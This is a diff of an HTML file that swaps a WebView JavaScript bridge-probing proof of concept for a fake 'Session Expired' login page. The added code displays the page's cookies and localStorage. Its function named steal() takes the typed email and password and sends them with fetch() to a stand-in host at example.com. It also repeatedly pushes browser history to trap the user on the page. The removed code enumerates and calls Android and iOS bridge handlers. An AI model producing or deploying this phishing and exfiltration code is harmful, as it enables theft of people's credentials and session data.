@@ -1,53 +1,44 @@
 <!DOCTYPE html>
 <html>
 <body style="font-family:sans-serif">
-<h2>WebView Bridge PoC</h2>
 
-<pre id="output">Running...</pre>
+<h2>Session Expired</h2>
+<p>Please log in again to continue</p>
+
+<input id="user" placeholder="Email"><br><br>
+<input id="pass" type="password" placeholder="Password"><br><br>
+
+<button onclick="steal()">Login</button>
+
+<pre id="info"></pre>
 
 <script>
-let output = [];
+// Show environment info
+document.getElementById("info").innerText =
+  "Origin: " + location.origin + "\n" +
+  "Cookies: " + document.cookie + "\n" +
+  "LocalStorage: " + JSON.stringify(localStorage);
 
-// Detect Android bridge
-if (window.Android) {
-  output.push("[+] Android bridge detected");
+// Fake credential capture
+function steal() {
+  let u = document.getElementById("user").value;
+  let p = document.getElementById("pass").value;
 
-  for (let key in window.Android) {
-    output.push("Method: " + key);
-  }
+  document.body.innerHTML = "<h3>Logging in...</h3>";
 
-  // Try calling a common test function
-  try {
-    window.Android.showToast("PoC executed");
-    output.push("[+] Called Android.showToast()");
-  } catch (e) {
-    output.push("[-] showToast failed: " + e);
-  }
+  // Simulate exfiltration
+  fetch("https://example.com/log?u=" + encodeURIComponent(u) + "&p=" + encodeURIComponent(p));
+
+  setTimeout(() => {
+    document.body.innerHTML = "<h3>Session expired. Try again later.</h3>";
+  }, 1000);
 }
 
-// Detect iOS bridge
-if (window.webkit && window.webkit.messageHandlers) {
-  output.push("[+] iOS bridge detected");
+// Optional: trap user in page
+setInterval(() => {
+  history.pushState({}, "", "#");
+}, 500);
 
-  for (let handler in window.webkit.messageHandlers) {
-    output.push("Handler: " + handler);
-
-    try {
-      window.webkit.messageHandlers[handler].postMessage("PoC");
-      output.push("[+] Called handler: " + handler);
-    } catch (e) {
-      output.push("[-] Failed handler: " + handler);
-    }
-  }
-}
-
-// If nothing found
-if (output.length === 0) {
-  output.push("[-] No bridge detected");
-}
-
-// Show results
-document.getElementById("output").innerText = output.join("\n");
 </script>
 
 </body>
